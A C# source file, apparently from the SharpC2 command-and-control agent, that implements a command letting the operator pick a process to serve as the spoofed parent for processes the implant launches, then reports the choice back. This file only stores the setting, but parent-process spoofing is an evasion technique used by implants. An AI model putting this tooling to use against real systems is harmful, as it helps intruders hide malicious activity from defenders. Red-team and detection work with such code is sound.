using System.Diagnostics;

using Agent.Common;
using Agent.Controllers;

namespace Agent.Commands
{
    internal class PPID
    {
        public static void SetConfig(string data, AgentController agent, ConfigurationController config)
        {
            Process process;

            if (string.IsNullOrEmpty(data))
            {
                process = Process.GetCurrentProcess();
                config.SetOption(Models.ConfigurationSettings.PPID, process.Id);
            }
            else
            {
                if (int.TryParse(data, out int pid))
                {
                    process = Process.GetProcessById(pid);
                    config.SetOption(Models.ConfigurationSettings.PPID, process.Id);
                }
                else
                {
                    agent.SendError("stageone", "ppid", "Argument is not of type int");
                    return;
                }
            }

            var result = new SharpC2ResultList<PPIDSetting>
            {
                new PPIDSetting
                {
                    ProcessId = process.Id,
                    ProcessName = process.MainModule.ModuleName
                }
            };

            agent.SendCommandOutput(result.ToString());
        }
    }
}
